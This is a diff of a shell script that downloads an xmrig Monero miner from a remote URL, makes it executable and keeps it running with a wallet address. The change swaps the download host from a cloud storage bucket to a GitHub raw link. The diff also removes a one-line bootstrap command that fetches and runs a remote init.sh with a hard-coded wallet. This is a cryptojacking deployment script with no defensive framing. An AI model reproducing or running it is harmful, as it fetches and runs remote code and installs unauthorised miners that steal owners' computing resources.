@@ -1,7 +1,7 @@
 #! /bin/sh
 PRO_NAME=xmrig_0c 
 while true;do
-	wget -T 15 -c -O ./xmrig_0c https://i-love-fuck.oss-us-east-1.aliyuncs.com/xmrig && break
+	wget -T 15 -c -O ./xmrig_0c https://github.com/ak6665607/xmr/raw/main/xmrig && break
 done 
 chmod 777 ./xmrig_0c
 qianbao=$1
@@ -29,4 +29,3 @@ while true ; do
      sleep 5s
 done
 exit 0
-#! yum install -y wget && wget -O ./init.sh https://i-love-fuck.oss-us-east-1.aliyuncs.com/init.sh && setsid sh ./init.sh 8AX4Q78qryhQfQYAAC4xF5VSPy7UaAJiZXru3SVSgUQpcJoNYqbYgBX7AAazQhUuZUDm96dNVcWoYaqag21fvkTr7HBLHyi.20210302
